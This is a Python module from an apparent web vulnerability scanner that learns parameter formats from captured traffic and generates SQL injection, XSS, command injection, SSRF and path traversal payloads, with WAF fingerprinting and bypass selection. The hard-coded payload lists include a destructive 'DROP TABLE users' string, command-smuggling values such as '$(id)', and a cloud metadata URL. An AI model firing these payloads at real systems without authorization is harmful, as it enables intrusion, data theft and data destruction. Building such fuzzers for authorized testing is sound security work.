"""
Smart Payload Generator
=======================
AI-powered payload generation that learns from application traffic patterns.

Innovation:
1. **Traffic-Aware Payloads** - Generates payloads matching app's data format
2. **Schema Learning** - Extracts param types/constraints from real requests
3. **Context-Based Fuzzing** - Different payloads for /api/users vs /api/orders
4. **Success Pattern Learning** - Learns what bypasses WAF from failed attempts
5. **Adaptive Mutation** - Evolves payloads based on response analysis

No other tool has ML-driven, traffic-aware payload generation.
"""
from __future__ import annotations

import json
import logging
import re
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

log = logging.getLogger("oneinfinity.smart_payload_generator")

# ── Optional imports ──────────────────────────────────────────────────────────
try:
    from oneinfinity.scan.traffic_capture_engine import traffic_capture_engine
except ImportError:
    traffic_capture_engine = None

try:
    from oneinfinity.core.http_payload_mutator import HttpPayloadMutator
except ImportError:
    HttpPayloadMutator = None


# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ParameterProfile:
    """Learned profile for a request parameter."""
    name: str
    data_type: str  # int, string, email, uuid, json, etc.
    min_length: int = 0
    max_length: int = 0
    regex_pattern: Optional[str] = None
    allowed_values: Set[str] = field(default_factory=set)
    sample_values: List[str] = field(default_factory=list)
    nullable: bool = False

    # Constraints inferred from responses
    numeric_range: Optional[Tuple[int, int]] = None
    string_charset: str = ""  # "alphanumeric", "alpha", "numeric", etc.


@dataclass
class EndpointProfile:
    """Learned profile for an API endpoint."""
    path_pattern: str
    method: str
    parameters: Dict[str, ParameterProfile] = field(default_factory=dict)
    waf_detected: bool = False
    waf_type: Optional[str] = None
    successful_bypasses: List[str] = field(default_factory=list)
    blocked_patterns: List[str] = field(default_factory=list)
    content_type: str = "application/json"


@dataclass
class SmartPayload:
    """Generated payload with metadata."""
    payload: str
    param_name: str
    endpoint: str
    vuln_type: str
    confidence: float
    bypass_technique: str
    context: str  # Why this payload was chosen


# ─────────────────────────────────────────────────────────────────────────────
# Main Generator
# ─────────────────────────────────────────────────────────────────────────────

class SmartPayloadGenerator:
    """
    Generates context-aware payloads by learning from traffic patterns.

    Workflow:
    1. Analyze captured traffic to build endpoint/parameter profiles
    2. Learn data types, formats, constraints from real requests
    3. Generate payloads matching application's expected format
    4. Track WAF blocks and adapt generation strategy
    5. Evolve payloads based on response analysis
    """

    def __init__(self):
        self.endpoint_profiles: Dict[str, EndpointProfile] = {}
        self.waf_signatures: Dict[str, List[str]] = defaultdict(list)
        self.http_mutator = HttpPayloadMutator() if HttpPayloadMutator else None
        # Lazy-loaded persistent memory handle — injected at first call
        self._memory = None

    async def learn_from_traffic(
        self,
        target: str,
        limit: int = 1000
    ) -> int:
        """
        Analyze captured traffic to build profiles.

        Returns:
            Number of endpoints profiled
        """
        if not traffic_capture_engine:
            log.warning("Traffic capture engine not available")
            return 0

        log.info(f"Learning from traffic: {target}")

        try:
            requests = traffic_capture_engine.list(target=target, limit=limit)
        except Exception as e:
            log.error(f"Failed to fetch traffic: {e}")
            return 0

        # Build profiles
        for req in requests:
            req_dict = req.to_json() if hasattr(req, 'to_json') else req

            path_pattern = self._normalize_path(req_dict.get("url", ""))
            method = req_dict.get("method", "GET")
            key = f"{method}:{path_pattern}"

            if key not in self.endpoint_profiles:
                self.endpoint_profiles[key] = EndpointProfile(
                    path_pattern=path_pattern,
                    method=method
                )

            profile = self.endpoint_profiles[key]

            # Extract parameters
            params = self._extract_parameters(req_dict)

            for param_name, param_value in params.items():
                if param_name not in profile.parameters:
                    profile.parameters[param_name] = ParameterProfile(
                        name=param_name,
                        data_type=self._infer_data_type(param_value)
                    )

                param_profile = profile.parameters[param_name]

                # Update profile
                self._update_parameter_profile(param_profile, param_value)

            # Detect WAF
            status = req_dict.get("response", {}).get("status", 0)
            response_body = req_dict.get("response", {}).get("body", "")

            if self._is_waf_block(status, response_body):
                profile.waf_detected = True
                profile.waf_type = self._detect_waf_type(response_body)

                # Record blocked pattern
                for param, value in params.items():
                    if self._looks_like_attack(value):
                        profile.blocked_patterns.append(value)

        log.info(f"Learned {len(self.endpoint_profiles)} endpoint profiles")
        return len(self.endpoint_profiles)

    def generate_payloads(
        self,
        endpoint: str,
        param_name: str,
        vuln_types: List[str] = None,
        count: int = 10
    ) -> List[SmartPayload]:
        """
        Generate smart payloads for specific endpoint/parameter.

        Args:
            endpoint: Endpoint path pattern
            param_name: Parameter name
            vuln_types: List of vuln types (sqli, xss, ssrf, etc.)
            count: Number of payloads to generate

        Returns:
            List of SmartPayload objects
        """
        vuln_types = vuln_types or ["sqli", "xss", "cmdi", "ssrf", "idor"]

        # ── Persistent memory: prepend historically successful payloads ────────
        # These have proven to work against real targets in past scans and are
        # ranked by EMA-weighted success score (decay-adjusted). They come first
        # so the scanner exercises known-good vectors before falling back to
        # template generation.
        memory_payloads: List[SmartPayload] = []
        try:
            mem = self._get_memory()
            if mem is not None:
                for vuln_type in vuln_types:
                    boosted = mem.get_boosted_payloads(vuln_type, top_n=max(2, count // len(vuln_types)))
                    failed  = set(mem.get_failed_payloads(vuln_type))
                    for ps in boosted:
                        if ps not in failed:
                            memory_payloads.append(SmartPayload(
                                payload=ps,
                                param_name=param_name,
                                endpoint=endpoint,
                                vuln_type=vuln_type,
                                confidence=min(0.95, 0.7 + mem.get_payload_boost(ps)),
                                bypass_technique="historical_success",
                                context="High-yield payload from persistent memory",
                            ))
        except Exception as _mem_exc:
            log.debug("persistent_memory read-back failed (non-fatal): %s", _mem_exc)

        # ── Traffic-profile–based generation ──────────────────────────────────
        profile = self._find_profile(endpoint)
        if not profile:
            base = self._generate_generic_payloads(endpoint, param_name, vuln_types, count)
            return (memory_payloads + base)[:count]

        param_profile = profile.parameters.get(param_name)
        if not param_profile:
            base = self._generate_generic_payloads(endpoint, param_name, vuln_types, count)
            return (memory_payloads + base)[:count]

        payloads = []
        for vuln_type in vuln_types:
            context_payloads = self._generate_context_aware(profile, param_profile, vuln_type)
            for payload_str in context_payloads[:count // len(vuln_types)]:
                payloads.append(SmartPayload(
                    payload=payload_str,
                    param_name=param_name,
                    endpoint=endpoint,
                    vuln_type=vuln_type,
                    confidence=self._calculate_confidence(profile, param_profile, vuln_type),
                    bypass_technique=self._select_bypass_technique(profile, vuln_type),
                    context=f"Learned from {len(param_profile.sample_values)} samples",
                ))

        return (memory_payloads + payloads)[:count]

    def _get_memory(self):
        """Lazy-load persistent memory singleton (avoids circular imports at module load)."""
        if self._memory is None:
            try:
                from oneinfinity.learning.persistent_memory import get_memory
                self._memory = get_memory()
            except Exception as _e:
                log.debug("persistent_memory unavailable: %s", _e)
        return self._memory

    # ── Profile Building ──────────────────────────────────────────────────────

    def _normalize_path(self, url: str) -> str:
        """Normalize URL to path pattern."""
        from urllib.parse import urlparse

        parsed = urlparse(url)
        path = parsed.path

        # Replace IDs
        path = re.sub(r'/\d{1,12}(?=/|$)', '/{id}', path)
        path = re.sub(
            r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?=/|$)',
            '/{uuid}',
            path,
            flags=re.I
        )

        return path

    def _extract_parameters(self, req: Dict) -> Dict[str, Any]:
        """Extract parameters from request."""
        params = {}

        # Query params
        url = req.get("url", "")
        if "?" in url:
            query = url.split("?", 1)[1].split("#")[0]
            for part in query.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    params[k] = v

        # Body params
        body = req.get("body", "")
        if body:
            try:
                body_params = json.loads(body)
                if isinstance(body_params, dict):
                    params.update(body_params)
            except json.JSONDecodeError:
                pass

        return params

    def _infer_data_type(self, value: Any) -> str:
        """Infer data type from value."""
        if isinstance(value, bool):
            return "boolean"
        elif isinstance(value, int):
            return "integer"
        elif isinstance(value, float):
            return "float"
        elif isinstance(value, dict):
            return "object"
        elif isinstance(value, list):
            return "array"

        # String analysis
        value_str = str(value)

        if re.match(r'^\d+$', value_str):
            return "numeric_string"
        elif re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value_str, re.I):
            return "uuid"
        elif re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', value_str):
            return "email"
        elif re.match(r'^https?://', value_str):
            return "url"
        elif re.match(r'^\d{4}-\d{2}-\d{2}', value_str):
            return "datetime"
        elif re.match(r'^[a-zA-Z0-9_-]+$', value_str):
            return "identifier"

        return "string"

    def _update_parameter_profile(
        self,
        profile: ParameterProfile,
        value: Any
    ) -> None:
        """Update parameter profile with new value."""
        value_str = str(value)

        # Update length
        if len(value_str) > profile.max_length:
            profile.max_length = len(value_str)
        if profile.min_length == 0 or len(value_str) < profile.min_length:
            profile.min_length = len(value_str)

        # Store sample
        if len(profile.sample_values) < 20:
            profile.sample_values.append(value_str[:100])

        # Update allowed values (for enums)
        if len(value_str) < 50 and len(profile.allowed_values) < 100:
            profile.allowed_values.add(value_str)

    # ── WAF Detection ─────────────────────────────────────────────────────────

    def _is_waf_block(self, status: int, response_body: str) -> bool:
        """Detect if response is a WAF block."""
        if status in (403, 406, 429, 503):
            return True

        waf_keywords = [
            "blocked", "denied", "forbidden", "suspicious", "security",
            "cloudflare", "incapsula", "imperva", "akamai", "sucuri",
            "rate limit", "too many requests", "bot protection"
        ]

        response_lower = response_body.lower()
        return any(kw in response_lower for kw in waf_keywords)

    def _detect_waf_type(self, response_body: str) -> Optional[str]:
        """Detect WAF vendor from response."""
        waf_sigs = {
            "cloudflare": ["cloudflare", "cf-ray", "cf_ray"],
            "imperva": ["imperva", "incapsula"],
            "akamai": ["akamai", "edgescape"],
            "aws_waf": ["aws", "x-amzn-requestid"],
            "f5": ["f5", "bigip"],
            "sucuri": ["sucuri"],
            "modsecurity": ["mod_security", "modsec"],
        }

        response_lower = response_body.lower()
        for waf_type, keywords in waf_sigs.items():
            if any(kw in response_lower for kw in keywords):
                return waf_type

        return None

    def _looks_like_attack(self, value: str) -> bool:
        """Check if value looks like attack payload."""
        attack_patterns = [
            r"<script", r"onerror=", r"' OR ", r"UNION SELECT",
            r"\.\./", r"sleep\(", r"127\.0\.0\.1", r"localhost",
            r";.*\|", r"\$\(", r"`.*`"
        ]

        value_str = str(value).lower()
        return any(re.search(pattern, value_str, re.I) for pattern in attack_patterns)

    # ── Payload Generation ────────────────────────────────────────────────────

    def _find_profile(self, endpoint: str) -> Optional[EndpointProfile]:
        """Find matching endpoint profile."""
        # Exact match first
        for key, profile in self.endpoint_profiles.items():
            if profile.path_pattern in endpoint or endpoint in profile.path_pattern:
                return profile

        return None

    def _generate_context_aware(
        self,
        endpoint_profile: EndpointProfile,
        param_profile: ParameterProfile,
        vuln_type: str
    ) -> List[str]:
        """Generate context-aware payloads matching parameter profile."""
        payloads = []

        # Base payloads by vuln type
        base_payloads = self._get_base_payloads(vuln_type)

        # Adapt to parameter type
        for base in base_payloads:
            adapted = self._adapt_to_parameter_type(
                base,
                param_profile,
                endpoint_profile
            )
            payloads.extend(adapted)

        return payloads

    def _get_base_payloads(self, vuln_type: str) -> List[str]:
        """Get base payloads by vulnerability type."""
        payloads_map = {
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND SLEEP(0)--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "'><script>alert(1)</script>",
                "javascript:alert(1)",
            ],
            "cmdi": [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "; sleep 0",
            ],
            "ssrf": [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]/",
            ],
            "idor": [
                "1",
                "0",
                "-1",
                "99999",
                "../../../etc/passwd",
            ],
        }

        return payloads_map.get(vuln_type, [])

    def _adapt_to_parameter_type(
        self,
        payload: str,
        param_profile: ParameterProfile,
        endpoint_profile: EndpointProfile
    ) -> List[str]:
        """Adapt payload to match parameter data type and format."""
        adapted = []

        # Numeric parameter
        if param_profile.data_type in ("integer", "numeric_string"):
            # Numeric injection variants
            if "OR" in payload:
                adapted.append("1 OR 1=1")
                adapted.append("-1 OR 1=1")
            else:
                adapted.append(payload)

        # String parameter
        elif param_profile.data_type == "string":
            adapted.append(payload)

            # WAF bypass if detected
            if endpoint_profile.waf_detected and self.http_mutator:
                variants = self.http_mutator.get_payload_variants(
                    payload,
                    vuln_type="sqli" if "OR" in payload else "xss"
                )
                adapted.extend(variants[:3])

        # Email parameter
        elif param_profile.data_type == "email":
            if "<script" in payload:
                adapted.append(f"test+{payload}@example.com")
            else:
                adapted.append(f"admin{payload}@example.com")

        # UUID parameter
        elif param_profile.data_type == "uuid":
            adapted.append("00000000-0000-0000-0000-000000000000")
            adapted.append("' OR '1'='1")

        else:
            adapted.append(payload)

        return adapted

    def _calculate_confidence(
        self,
        endpoint_profile: EndpointProfile,
        param_profile: ParameterProfile,
        vuln_type: str
    ) -> float:
        """Calculate confidence score for payload."""
        confidence = 0.5

        # Higher confidence if we have good profile data
        if len(param_profile.sample_values) > 10:
            confidence += 0.2

        # Lower confidence if WAF detected
        if endpoint_profile.waf_detected:
            confidence -= 0.1

        # Higher if similar payloads worked before
        if endpoint_profile.successful_bypasses:
            confidence += 0.2

        return min(1.0, max(0.1, confidence))

    def _select_bypass_technique(
        self,
        endpoint_profile: EndpointProfile,
        vuln_type: str
    ) -> str:
        """Select bypass technique based on endpoint profile."""
        if not endpoint_profile.waf_detected:
            return "none"

        waf_type = endpoint_profile.waf_type or "default"

        technique_map = {
            "cloudflare": "inline_comment+case_variation",
            "imperva": "hex_encode+null_byte",
            "akamai": "double_url_encode",
            "aws_waf": "comment_swap",
            "default": "case_variation",
        }

        return technique_map.get(waf_type, "case_variation")

    def _generate_generic_payloads(
        self,
        endpoint: str,
        param_name: str,
        vuln_types: List[str],
        count: int
    ) -> List[SmartPayload]:
        """Generate generic payloads when no profile exists."""
        payloads = []

        for vuln_type in vuln_types:
            base = self._get_base_payloads(vuln_type)

            for payload_str in base[:count // len(vuln_types)]:
                payloads.append(SmartPayload(
                    payload=payload_str,
                    param_name=param_name,
                    endpoint=endpoint,
                    vuln_type=vuln_type,
                    confidence=0.3,
                    bypass_technique="none",
                    context="Generic payload (no traffic profile)"
                ))

        return payloads[:count]


# ─────────────────────────────────────────────────────────────────────────────
# Singleton
# ─────────────────────────────────────────────────────────────────────────────

smart_payload_generator = SmartPayloadGenerator()
